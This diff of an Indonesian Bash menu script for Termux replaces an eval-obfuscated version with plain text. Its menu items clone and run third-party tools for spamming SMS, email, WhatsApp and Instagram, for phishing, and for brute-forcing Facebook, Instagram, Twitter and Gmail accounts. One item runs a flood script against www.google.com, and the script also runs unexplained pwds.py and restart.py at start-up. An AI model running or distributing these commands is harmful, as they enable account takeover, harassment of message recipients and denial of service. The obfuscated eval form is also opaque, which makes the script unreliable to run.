@@ -1,3 +1,314 @@
-z="
-";GIz='hub.';mHz='tasp';vDz='al";';YEz='nlin';DGz='curl';XCz='e th';jEz='Auto';ZBz='$g"▒';hKz='sant';aEz='15] ';XKz='ll p';RDz='nda}';bEz=' IG"';dIz='oot ';jDz='PHIS';gEz='18] ';ZIz='cd g';VCz='s fo';oJz='pip ';MHz=' *';IDz='p 2';EHz='/eva';wJz='cd x';CDz='do';LKz='wa.p';oGz='ize';kKz='t-on';SHz='ice/';YJz='MBF.';DKz='te -';QBz='figl';vKz='ice ';iLz='CKER';RHz='xcho';WEz='Sant';sIz='h.sh';JJz='ip';Dz='tf "';YKz='ytho';SKz='cd O';LHz='d +x';qKz='ot';dKz='ub.c';jCz='"~~>';qz='E[31';LCz=' " C';CGz='-y';gGz='on2';lKz='line';JHz='an';OCz=' @de';HIz='com/';OHz='10) ';nBz='    ';UEz='nfo"';KKz='cd p';QEz=' Gma';xEz='ones';MLz='21)e';LGz='thub';MDz='   [';eEz='17] ';pCz=' ""';YIz='lshe';HDz='༎+_+';HGz='clon';AIz='h ad';pDz=' 6] ';IKz='12/p';cHz=' "ro';RBz='et D';rJz='/alb';vCz='whil';TKz='SIF';FIz='/git';cJz='g"ma';GHz='ecur';IEz='10] ';Tz='ICAL';KLz=' tew';MJz='890/';qJz='ests';LDz='$g "';FCz='r   ';LFz='Moda';ZEz='e";';Xz='0m\n';tEz='ak C';SCz=' $wh';vFz='ade';LEz='am (';MEz='11] ';Cz='prin';EDz='༎༎༎༎';SFz='Secu';GGz='git ';KGz='//gi';MBz='6m'\''';oEz='Temb';ez='esta';yIz=' ini';kJz='erun';JKz='rank';dGz='pame';yz='E[36';gCz='_c()';BJz='7) p';xKz='star';AKz='pp.p';GFz='ial ';CKz='16) ';XEz='et O';tCz='lagi';ZFz='LS <';GJz=' --u';dEz=' WA"';ICz='Hack';eCz='INT';UBz='lcat';PHz='/the';eKz='om/G';AHz='m.py';BKz='17) ';jFz='pil ';PGz='ARTH';oFz=' $pi';TGz='dete';fIz=', ba';ODz='Cek ';cLz='Y; D';MGz='.com';dLz='OFFI';iz='033[';tFz='apt ';tLz='  | ';iBz=' R▒▒';tGz='mspa';eFz='er]"';DIz=' htt';jHz='aspa';TIz='12) ';wIz='ses ';nGz='chan';JIz='inux';NGz='/Len';BEz='l";';dJz='af a';ZDz='ndc}';DJz='mech';yDz='et+M';eBz='$g" ';lDz='V4${';mBz='   "';WBz='p 1';yKz='sudo';oIz='aceb';Hz='1;77';vLz='at';FBz='enda';KCz='hite';kHz='ls';gFz=' -p ';nz='\E[3';MFz='r/Ex';UHz='ll';VHz='cd i';nJz='on';Nz='<<::';VEz='14] ';FLz='e $g';aCz=' "__';rIz='ebas';lBz='▒  X';DCz=' " A';rz='m'\''';sFz='date';KDz='++ "';fDz='${en';RFz=' OFF';Iz='m  :';EEz='ans ';iIz='jala';WFz='luti';aIz=' gma';xHz='bun ';BHz='4) g';SJz='cd b';DBz='='\''\E';BDz=' ];';xz='c='\''\';QJz='ack-';aKz='http';yHz='masi';Zz='pyth';OBz=''\''\e[';HBz='33[0';BBz='E[37';cFz='ype ';hBz='▒▒▒ ';Sz=':OFF';cBz='   ▒';HFz='Sing';NCz='ct  ';oKz='18)a';sLz='..."';XGz=';;';gJz='8) e';Kz='>>>D';mCz='.. "';LBz='cyan';WIz='grad';vz='m='\''\';rHz='jone';tz='E[32';OGz='er/E';kCz=' oke';MIz='weet';nHz='am.s';PLz='Habi';KEz='tagr';pBz='$bl"';vEz='khus';Bz='r';EFz='ol/T';iCz='$red';DLz='5)ec';CBz='endc';cIz='$g"r';TFz='ritu';aLz='e[1;';jLz='\e[0';JCz='er$w';mGz='s me';TBz='| lo';iJz='kura';QGz='QUAK';uFz='upgr';RIz='u mb';hz='b='\''\';uDz='mass';WGz='.php';CHz='it c';IJz='de p';EJz='aniz';HJz='pgra';dHz='ot d';OFz='$m "';dz='on r';wDz=' 8] ';AJz=' nke';lHz='spam';iEz='ube ';eIz='dulu';uCz='=1';BFz='Cara';sDz='et${';dCz='l_c ';VLz='$bu"';ZJz='py';uKz='serv';nCz='$cya';PEz='12] ';Fz='[101';qFz='1)ap';kBz=' U▒▒';EBz='[0m'\''';xGz='h';CFz=' Gun';hFz='"===';aJz='6) e';BIz='a ;v';BGz='ssh ';EIz='ps:/';fBz=' T▒▒';aBz='▒▒  ';eDz='l V3';UCz='ank,';IBz='blue';eHz='ulu"';YGz='2) a';ZKz='n';GEz='#roo';Oz=':::\';jKz='ante';ULz='-"';fHz='15) ';Yz='"';QFz='QUAD';Az='clea';nEz='19] ';cz='.py';DEz=' FB ';qGz='bash';PIz='root';IIz='thel';FHz='it-s';kIz='9)ap';gLz='NTER';pHz='cho ';OIz='etsh';xIz='tool';nDz=' 5] ';uEz='ewe(';vBz=' " T';fGz='cd s';bFz='   T';YBz=' -e ';SLz='bu"K';jGz='tall';bGz='e';fCz='ctrl';HHz='ity/';oDz='GAME';oz='0m'\''';XFz='on'\''s';XDz='Emai';bLz='77mB';Wz=':\e[';rCz='.."';bBz=' ▒▒▒';dDz='omse';wFz='pkg ';Qz='\n"';tHz='anta';LLz='as"';DHz='lone';eGz='mail';UGz='ksig';bz='pwds';xLz='done';FGz='php ';pIz='ash';Uz=' TOO';GKz='/sip';XIz='gmai';TLz='HO  ';tBz='____';yEz=' )";';ZCz=' :) ';WLz='THAN';hJz='g"Ma';GCz=' Len';gIz='ru b';ECz='utho';oLz='IH Y';uGz='m';cGz='er/s';rFz='t up';VFz='t Il';qEz='uota';dBz='  "';JGz='tps:';OEz='tter';HCz='tera';mKz='on s';kGz=' req';AEz='assa';pJz='requ';DDz='+_+༎';NBz='red=';CLz=' URL';hDz=';';tJz='angg';wz='E[35';qBz='."';NDz=' 1] ';JFz='-" ;';fz='rt.p';pFz='l in';jIz='n "';rBz='$bu ';sBz='"___';EKz='ade ';vIz='u ak';mz='bl='\''';mLz='*) e';lz='4m'\''';SBz='UAD ';YDz='l${e';QIz=' dul';wKz='tor ';tIz=' kal';THz='ashe';Jz='::::';xBz='   :';YCz='is t';XBz='echo';IFz='kat_';tKz='t';UFz=' Jus';UDz='Spam';xJz='l-py';hHz='te';UKz='osif';SIz='od"';oCz='n"..';MKz='hp';BCz='S$wh';iHz='git';XJz='b';TEz='Fb I';NKz='13) ';yGz='on t';NEz=' Twi';gKz='e98/';lCz=',  .';vHz='o.."';lIz=' && ';OLz='tok ';mJz='19) ';UJz='forc';GBz='='\''\0';mEz='oot)';sz='g='\''\';VIz='& ap';bDz='Sms ';pz='r='\''\';RLz='0) e';RCz='a_10';uz='bu='\''';mDz='}";';wBz='ools';sEz='20] ';bKz='s://';cKz='gith';wGz=' i.s';Lz='W SQ';xFz='inst';hGz='pip2';rGz='er/t';gBz='▒  E';qIz=' fac';BLz='t.sh';rDz='targ';fEz=' Sms';kDz='ING ';FKz='php';hLz='A HA';HEz='t)";';NFz='it";';HLz='itop';ZLz='03m\';mIz='face';Vz='LS::';Pz='e[0m';Ez='  \e';JLz='udah';AGz='open';pEz='ak K';aHz='ell.';bIz='ilsh';WJz='ck-f';ADz='t 20';nKz='t.py';VBz='slee';gDz='dc}"';nIz='cd f';gz='y';OKz='/CiK';qCz='$r".';ACz='TOOL';WKz='kg i';uBz='_"';iDz=' 4] ';hEz='Yout';Mz='UAD<';TDz=' 2] ';RGz='E';fJz='sial';wCz='e [ ';QKz='/OSI';KHz='chmo';VKz='14)p';sGz='elko';JEz=' Ins';qHz='"lu ';CCz='ite ';ALz=' ./y';jBz='▒ M ';PCz='waba';HKz='utra';PBz='1;31';bHz='sh';uIz='o ma';kz='u='\''\';QLz='s"';RKz='F';xDz='Targ';PDz='Gemp';IGz='e ht';xCz='$lag';hIz='isa ';sJz='erto';CEz=' 9] ';wEz='us j';LJz='ian9';ZHz='tash';IHz='weem';CJz='ip2 ';NJz='brut';Gz='m\e[';pGz='3) a';jJz='ng b';WDz='jan ';cCz=' ctr';FFz='utor';MCz='onta';uJz='i/xl';rKz='cd y';iKz='et-o';sKz='oubo';GDz=' VIP';uHz='i br';Rz='m ::';VDz=' Tro';CIz='11)g';QCz='skar';ABz='w='\''\';sCz='}';cEz='16] ';nFz='case';az='on2 ';NHz='an.p';aDz=' 3] ';yFz='all ';SDz='";';NIz=' twe';mFz='OLS ';KFz=' 0] ';XLz='K'\''S"';lJz='tung';fKz='amey';UIz='te &';XHz='shel';RJz='fb';oBz=' "';cDz='Telk';GLz='"sen';fLz='| LE';eLz='CAL ';FEz='   (';LIz='ce/t';ELz='ho -';pKz='youb';EGz=' -y';tDz=' 7] ';dFz='Numb';ZGz='pt u';gHz='upda';AFz='21] ';lGz='uest';YFz='==> ';PJz='ce-h';WCz='r us';PKz='u370';kFz=' ;';TCz=' "Th';lLz='exit';JBz='='\''\e';yCz='i -l';YLz='\e[1';SEz='13] ';fFz='read';jz='1m'\''';yJz='on a';REz='il  ';iGz=' ins';wLz='esac';YHz='l';QDz='a${e';vJz='-py';iFz='=>" ';QHz='linu';yBz=' DW ';qDz=' fb ';rEz=' XL"';PFz='DW S';eJz='nda ';JDz='++++';hCz=' {';DFz='a To';KBz='[1;3';KJz='/alp';NLz='bu"S';OJz='efor';FJz='s';rLz='CoK.';uLz='lolc';pLz='G BE';lFz='W TO';SGz='cd E';KIz='choi';vGz='cd t';nLz='"PIL';aFz='==[ ';FDz='MENU';oHz='20)e';kEz='View';bCz='trap';bJz='-e $';VJz='e-ha';aGz='pdat';TJz='rute';WHz='nsta';lEz=' (#r';sHz='s? s';ILz='eng ';qLz='NER ';kLz='m\n"';VGz='empa';wHz=' "sa';
-eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Jz$Kz$Lz$Mz$Nz$Jz$Oz$Pz$Qz$z$Cz$Dz$Ez$Fz$Gz$Hz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$z$Zz$az$bz$cz$z$Zz$dz$ez$fz$gz$z$hz$iz$jz$z$kz$iz$lz$z$mz$nz$oz$z$pz$qz$rz$z$sz$tz$rz$z$uz$nz$lz$z$vz$wz$rz$z$xz$yz$rz$z$ABz$BBz$rz$z$CBz$DBz$EBz$z$FBz$GBz$HBz$rz$z$IBz$JBz$KBz$lz$z$LBz$JBz$KBz$MBz$z$NBz$OBz$PBz$rz$z$QBz$RBz$Lz$SBz$TBz$UBz$z$VBz$WBz$z$XBz$YBz$ZBz$aBz$bBz$cBz$aBz$bBz$cBz$aBz$bBz$cBz$aBz$dBz$z$XBz$YBz$eBz$fBz$gBz$hBz$iBz$jBz$hBz$kBz$lBz$bBz$mBz$z$XBz$YBz$ZBz$aBz$bBz$cBz$aBz$bBz$cBz$aBz$bBz$cBz$aBz$nBz$nBz$oBz$z$XBz$YBz$pBz$qBz$z$XBz$YBz$rBz$sBz$tBz$tBz$tBz$tBz$tBz$tBz$tBz$tBz$tBz$uBz$z$XBz$YBz$rBz$vBz$wBz$nBz$xBz$yBz$ACz$BCz$CCz$nBz$nBz$oBz$z$XBz$YBz$rBz$DCz$ECz$FCz$xBz$GCz$HCz$ICz$JCz$KCz$dBz$z$XBz$YBz$rBz$LCz$MCz$NCz$xBz$OCz$PCz$QCz$RCz$SCz$CCz$Yz$z$XBz$YBz$rBz$TCz$UCz$VCz$WCz$XCz$YCz$wBz$ZCz$oBz$z$XBz$YBz$rBz$aCz$tBz$tBz$tBz$tBz$tBz$tBz$tBz$tBz$tBz$uBz$z$VBz$WBz$z$bCz$cCz$dCz$eCz$z$fCz$gCz$hCz$z$Az$Bz$z$XBz$YBz$iCz$jCz$kCz$lCz$mCz$z$XBz$YBz$nCz$oCz$Yz$z$VBz$WBz$z$XBz$pCz$z$XBz$YBz$qCz$rCz$z$VBz$WBz$z$sCz$z$tCz$uCz$z$vCz$wCz$xCz$yCz$ADz$BDz$z$CDz$z$VBz$WBz$z$XBz$YBz$eBz$nBz$DDz$EDz$EDz$FDz$GDz$EDz$EDz$HDz$oBz$z$VBz$IDz$z$XBz$YBz$eBz$JDz$JDz$JDz$JDz$JDz$JDz$JDz$JDz$JDz$KDz$z$XBz$YBz$LDz$MDz$NDz$ODz$PDz$QDz$RDz$SDz$z$XBz$YBz$LDz$MDz$TDz$UDz$VDz$WDz$XDz$YDz$ZDz$SDz$z$XBz$YBz$LDz$MDz$aDz$UDz$VDz$WDz$bDz$cDz$dDz$eDz$fDz$gDz$hDz$z$XBz$YBz$LDz$MDz$iDz$jDz$kDz$lDz$CBz$mDz$z$XBz$YBz$LDz$MDz$nDz$jDz$kDz$oDz$fDz$gDz$hDz$z$XBz$YBz$eBz$MDz$pDz$ICz$qDz$rDz$sDz$CBz$mDz$z$XBz$YBz$LDz$MDz$tDz$ICz$qDz$uDz$vDz$z$XBz$YBz$eBz$MDz$wDz$ICz$qDz$xDz$yDz$AEz$BEz$z$XBz$YBz$LDz$MDz$CEz$ICz$DEz$EEz$FEz$GEz$HEz$z$XBz$YBz$LDz$MDz$IEz$ICz$JEz$KEz$LEz$GEz$HEz$z$XBz$YBz$LDz$MDz$MEz$ICz$NEz$OEz$FEz$GEz$HEz$z$XBz$YBz$LDz$MDz$PEz$ICz$QEz$REz$FEz$GEz$HEz$z$XBz$YBz$LDz$MDz$SEz$TEz$UEz$hDz$z$XBz$YBz$LDz$MDz$VEz$WEz$XEz$YEz$ZEz$z$XBz$YBz$LDz$MDz$aEz$UDz$bEz$hDz$z$XBz$YBz$LDz$MDz$cEz$UDz$dEz$hDz$z$XBz$YBz$LDz$MDz$eEz$UDz$fEz$SDz$z$XBz$YBz$LDz$MDz$gEz$hEz$iEz$jEz$kEz$lEz$mEz$SDz$z$XBz$YBz$LDz$MDz$nEz$oEz$pEz$qEz$rEz$hDz$z$XBz$YBz$LDz$MDz$sEz$oEz$tEz$uEz$vEz$wEz$xEz$yEz$z$XBz$YBz$LDz$MDz$AFz$BFz$CFz$DFz$EFz$FFz$GFz$HFz$IFz$JFz$z$XBz$YBz$LDz$MDz$KFz$LFz$MFz$NFz$z$XBz$pCz$z$XBz$YBz$OFz$PFz$QFz$RFz$Tz$Yz$z$XBz$YBz$OFz$SFz$TFz$UFz$VFz$WFz$XFz$YFz$PFz$QFz$Uz$ZFz$aFz$nBz$bFz$cFz$dFz$eFz$z$fFz$gFz$hFz$iFz$jFz$kFz$z$QBz$RBz$lFz$mFz$TBz$UBz$z$nFz$oFz$pFz$z$qFz$rFz$sFz$z$tFz$uFz$vFz$z$wFz$xFz$yFz$AGz$BGz$CGz$z$wFz$xFz$yFz$DGz$EGz$z$wFz$xFz$yFz$FGz$CGz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$NGz$HCz$ICz$OGz$PGz$QGz$RGz$z$SGz$PGz$QGz$RGz$z$FGz$TGz$UGz$VGz$WGz$z$XGz$z$YGz$ZGz$aGz$bGz$z$tFz$uFz$vFz$z$wFz$xFz$yFz$GGz$CGz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$NGz$HCz$ICz$cGz$dGz$eGz$z$fGz$dGz$eGz$z$wFz$xFz$yFz$Zz$gGz$z$hGz$iGz$jGz$kGz$lGz$mGz$nGz$oGz$z$Zz$az$eGz$cz$z$XGz$z$pGz$ZGz$aGz$bGz$z$tFz$uFz$vFz$z$wFz$xFz$yFz$qGz$EGz$z$wFz$xFz$yFz$GGz$CGz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$NGz$HCz$ICz$rGz$sGz$tGz$uGz$z$vGz$sGz$tGz$uGz$z$qGz$wGz$xGz$z$Zz$yGz$sGz$tGz$AHz$z$XGz$z$BHz$CHz$DHz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$EHz$FHz$GHz$HHz$IHz$JHz$z$KHz$LHz$MHz$z$Zz$az$IHz$NHz$gz$z$XGz$z$OHz$GGz$HGz$bGz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$PHz$QHz$RHz$SHz$xFz$THz$UHz$z$VHz$WHz$XHz$YHz$z$qGz$iGz$ZHz$aHz$bHz$z$VBz$WBz$z$XBz$cHz$dHz$eHz$z$XGz$z$fHz$tFz$gHz$hHz$z$tFz$uFz$vFz$z$tFz$xFz$yFz$iHz$z$GGz$HGz$bGz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$PHz$QHz$RHz$SHz$xFz$jHz$uGz$z$kHz$z$VHz$WHz$lHz$z$qGz$iGz$mHz$nHz$xGz$z$XGz$z$oHz$pHz$qHz$rHz$sHz$tHz$uHz$vHz$z$XBz$wHz$xHz$yHz$AIz$BIz$Yz$z$XGz$z$CIz$CHz$DHz$DIz$EIz$FIz$GIz$HIz$IIz$JIz$KIz$LIz$MIz$XHz$YHz$z$vGz$MIz$XHz$YHz$z$KHz$LHz$NIz$OIz$aHz$bHz$z$qGz$NIz$OIz$aHz$bHz$z$VBz$IDz$z$XBz$YBz$LDz$PIz$QIz$RIz$SIz$z$XGz$z$TIz$tFz$gHz$UIz$VIz$rFz$WIz$bGz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$PHz$QHz$RHz$SHz$XIz$YIz$UHz$z$ZIz$eGz$XHz$YHz$z$qGz$aIz$bIz$aHz$bHz$z$VBz$WBz$z$XBz$YBz$cIz$dIz$eIz$fIz$gIz$hIz$iIz$jIz$z$XGz$z$kIz$rFz$sFz$lIz$tFz$uFz$vFz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$PHz$QHz$RHz$SHz$mIz$qGz$z$nIz$oIz$pIz$z$qGz$qIz$rIz$sIz$z$VBz$IDz$z$XBz$YBz$cIz$dIz$eIz$tIz$uIz$vIz$wIz$xIz$yIz$AJz$oBz$z$XGz$z$BJz$CJz$xFz$yFz$DJz$EJz$bGz$z$hGz$iGz$jGz$kGz$lGz$FJz$z$hGz$iGz$jGz$GJz$HJz$IJz$JJz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$KJz$LJz$MJz$NJz$OJz$PJz$QJz$RJz$z$SJz$TJz$UJz$VJz$WJz$XJz$z$Zz$az$YJz$ZJz$z$XGz$z$aJz$pHz$bJz$cJz$dJz$eJz$fJz$Yz$z$XGz$z$gJz$pHz$bJz$hJz$dJz$eJz$iJz$jJz$kJz$lJz$Yz$z$XGz$z$mJz$hGz$iGz$jGz$kGz$lGz$FJz$z$wFz$xFz$yFz$Zz$nJz$z$wFz$xFz$yFz$iHz$z$oJz$xFz$yFz$pJz$qJz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$rJz$sJz$tJz$uJz$vJz$z$wJz$xJz$z$Zz$yJz$AKz$gz$z$XGz$z$BKz$tFz$gHz$hHz$z$tFz$uFz$vFz$z$wFz$xFz$yFz$GGz$CGz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$NGz$HCz$ICz$cGz$dGz$eGz$z$fGz$dGz$eGz$z$wFz$xFz$yFz$Zz$gGz$z$hGz$iGz$jGz$kGz$lGz$mGz$nGz$oGz$z$Zz$az$eGz$cz$z$XGz$z$CKz$tFz$gHz$DKz$gz$z$tFz$uFz$EKz$CGz$z$tFz$xFz$yFz$iHz$z$tFz$xFz$yFz$FKz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$GKz$HKz$IKz$JKz$z$KKz$JKz$z$kHz$z$FGz$LKz$MKz$z$XGz$z$NKz$GGz$HGz$IGz$JGz$KGz$LGz$MGz$OKz$PKz$QKz$RKz$z$SKz$TKz$z$Zz$az$UKz$cz$z$XGz$z$VKz$WKz$WHz$XKz$YKz$ZKz$z$GGz$HGz$bGz$z$aKz$bKz$cKz$dKz$eKz$fKz$gKz$hKz$iKz$YEz$bGz$z$fGz$jKz$kKz$lKz$z$Zz$mKz$jKz$nKz$z$XGz$z$oKz$ZGz$aGz$bGz$z$tFz$uFz$vFz$z$tFz$xFz$yFz$Zz$nJz$z$tFz$xFz$yFz$iHz$z$GGz$HGz$IGz$JGz$KGz$LGz$MGz$PHz$QHz$RHz$SHz$pKz$qKz$z$rKz$sKz$tKz$z$uKz$vKz$wKz$xKz$tKz$z$yKz$ALz$sKz$BLz$CLz$z$XGz$z$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$LLz$z$XGz$z$MLz$pHz$bJz$NLz$OLz$PLz$QLz$z$XGz$z$RLz$pHz$bJz$SLz$TLz$ULz$z$XBz$YBz$VLz$WLz$XLz$z$Cz$Dz$YLz$ZLz$aLz$bLz$cLz$Lz$SBz$dLz$eLz$fLz$gLz$hLz$iLz$jLz$kLz$z$VBz$IDz$z$lLz$z$XGz$z$mLz$pHz$nLz$oLz$pLz$qLz$rLz$sLz$tLz$uLz$vLz$z$wLz$z$xLz$z$xLz"
+###SCRIPT RUSAK !!! BELUM PERBAIKAN
+#!/bin/bash
+#version 1.0
+
+pkg update
+pkg upgrade
+pkg install git 
+pkg install php  
+pkg install wget  
+pkg install figlet  
+pkg install toilet 
+pkg install python2  
+pkg install python  
+pkg install ruby  
+gem install lolcat 
+pip2 install requests
+pip2 install termcolor
+
+clear
+printf "  \e[101m\e[1;77m  :::::::::>>>Samlekom mamank<<<:::::::::\e[0m\n"
+printf "  \e[101m\e[1;77m :::DW SQUAD OFFFICAL TOOLS:::\e[0m\n"
+
+python2 pwds.py
+
+python restart.py
+
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+figlet MIX-Tools | lolcat
+
+sleep 1
+
+echo -e $g"▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒    "   
+echo -e $g"  T▒▒▒  E▒▒▒  R▒▒▒ M ▒▒▒  U▒▒▒  X ▒▒▒   "
+echo -e $g"▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒           " 
+echo -e $bl"."
+echo -e $bu "________________________________________"
+echo -e $bu  " Tools       : DwTOOLS$white          " 
+echo -e $bu  " Author      : LENTERA HACKER$white  " 
+echo -e $bu  " Contact     : @_dewabaskara_10 $white " 
+echo -e $bu  "Hello World  "
+
+echo -e $bu  "_______________________________________" 
+sleep 1
+###################################################
+# CTRL + C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"~~> taik,  ... "
+echo -e $cyan".."
+sleep 1
+echo ""
+echo -e $r"..."
+sleep 1
+}
+
+lagi=1
+while [ $lagi -lt 20 ];
+do
+
+sleep 1
+echo -e $g"     =MENU KIOS= "
+sleep 2
+echo -e $g" ++++++++++++++++++++++++++++++++++++++ "
+echo -e $g "   [ 1] Spam Trojan Sms${enda}";
+echo -e $g "   [ 2] Spam Trojan Email${endc}";
+echo -e $g "   [ 3] Cek Gempa${endc}";
+echo -e $g "   [ 4] User Search${endc}";
+echo -e $g "   [ 5] PHISING GAME${endc}";
+echo -e $g"    [ 6] TROJANZ WIFI${endc}";
+echo -e $g "   [ 7] Hack fb massal";
+echo -e $g"    [ 8] Hack fb Target+Massal";
+echo -e $g "   [ 9] Hack FB ans    (#root)";
+echo -e $g "   [10] Hack Instagram (#root)";
+echo -e $g "   [11] Hack Twitter   (#root)";
+echo -e $g "   [12] Hack Gmail     (#root)";
+echo -e $g "   [13] Fb Info";
+echo -e $g "   [14] Santet Online";
+echo -e $g "   [15] Spam IG";
+echo -e $g "   [16] Spam WA";
+echo -e $g "   [17] Spam Sms";
+echo -e $g "   [18] Youtube AutoView (#root)";
+echo -e $g "   [19] Tembak Kuota XL";
+echo -e $g "   [20] Tembak Cewe(khusus jones )";
+echo -e $g "   [21] Cara Guna Tool/Tutorial Singkat_-" ;
+echo -e $g "   [ 0] Exit";
+echo ""
+echo -e $bu "Pilih Sesuai Selera Anda :)" 
+echo -e $bu "Subscribe To Channel==> otomatis Gagal <==[        ga subskreb auto mandul kere boss:v]"
+read -p "====>" pil  ;
+
+figlet Mix-TooLs | lolcat
+#phs shelpis
+
+case $pil in
+1)apt update
+apt upgrade
+pkg install git 
+pkg install python2 
+git clone https://github.com/LenteraHacker/telkomspam
+cd telkomspam
+python telkomspam.py
+
+;;
+
+# phs be
+
+2) apt update
+apt upgrade
+pkg install python2 
+pkg install python 
+pkg install git 
+git clone https://github.com/LenteraHacker/spamemail
+cd spamemail
+pip install request mechanize
+python mail.py
+
+;;
+
+#phs socialfis
+
+3) apt update
+apt upgrade
+pkg install git 
+pkg install curl
+git clone https://github.com/LenteraHacker/EARTHQUAKE
+cd EARTHQUAKE
+pkg install php 
+php deteksigempa.php
+
+;;
+
+#phs weeman
+
+4) git clone 
+https://github.com/LenteraHacker/usersearch
+cd usersearch
+pkg install bash 
+bash search.sh
+
+;;
+
+#hack ig
+
+10) git clone 
+https://github.com/thelinuxchoice/instashell
+cd instashell
+bash instashell.sh
+sleep 1
+echo "root dulu"
+
+;;
+
+15) apt update
+apt upgrade
+apt install git
+git clone 
+https://github.com/thelinuxchoice/instaspam
+ls
+cd instaspam
+bash instaspam.sh
+
+;;
+
+20)echo "lu jones? santai bro.."
+echo "sabun masih ada ;v"
+
+;;
+
+11)git clone https://github.com/thelinuxchoice/tweetshell
+cd tweetshell
+chmod +x tweetshell.sh
+bash tweetshell.sh
+sleep 2
+echo -e $g "root dulu mbod"
+
+;;
+
+12) apt update && apt upgrade
+git clone https://github.com/thelinuxchoice/gmailshell
+cd gmailshell
+bash gmailshell.sh
+sleep 1
+echo -e $g"root dulu, baru bisa jalan "
+
+;;
+
+9)apt update && apt upgrade
+git clone https://github.com/thelinuxchoice/facebash
+cd facebash
+bash facebash.sh
+sleep 2
+echo -e $g"root dulu kalo mau akses tool ini nke "
+
+;;
+
+7) pip2 install mechanize
+pip2 install requests
+pip2 install --upgrade pip
+git clone https://github.com/alpian9890/bruteforce-hack-fb
+cd bruteforce-hack-fb.git
+python2 MBF.py
+
+;;
+
+6) pip2 install --upgrade pip
+git clone https://github.com/LenteraHacker/DWTROJAN
+python2 ddos.py www.google.com 8080 99999
+
+;;
+
+8) pip2 install --upgrade pip
+pip2 install mechanize
+pip2 install requests
+git clone https://github.com/Senitopeng/KumpulanFbbrute
+cd KumpulanFbbrute
+python2 jomblo.py
+
+;;
+
+19) pip2 install requests
+pkg install python
+pkg install git
+pip install requests
+git clone https://github.com/albertoanggi/xl-py
+cd xl-py
+python app.py
+
+;;
+
+17) pip2 install requests
+ apt install nano
+ apt install git
+ git clone https://github.com/Senitopeng/SpamSms
+ cd SpamSms
+ chmod +x mantan.py 
+ python2 mantan.py
+
+;;
+
+16) apt update 
+apt upgrade 
+apt install git
+apt install php
+git clone https://github.com/siputra12/prank
+cd prank
+ls
+php wa.php
+
+;;
+
+13) git clone https://github.com/CiKu370/OSIF
+cd OSIF
+python2 osif.py
+
+;;
+
+14)pkg install python
+git clone 
+https://github.com/Gameye98/santet-online
+cd santet-online
+python santet.py
+
+;;
+
+18)apt update
+apt upgrade
+apt install python
+apt install git
+git clone https://github.com/thelinuxchoice/youbot
+cd youbot
+service tor start
+sudo ./youbot.sh URL
+
+;;
+
+5) git clone 
+https://github.com/evait-security/weeman
+chmod +x *
+python2 weeman.py
+
+;;
+
+21)echo -e $bu"Stok Habis"
+
+;;
+0) echo -e $bu"DW SQUAD" 
+echo -e $bu"THANK'S"
+printf "\e[103m\e[1;77mBY; DW\e[0m\n"
+sleep 2
+exit
+;;
+
+*) echo "PILIH YG BENER CUK !!"  | lolcat
+esac
+done
+done
+
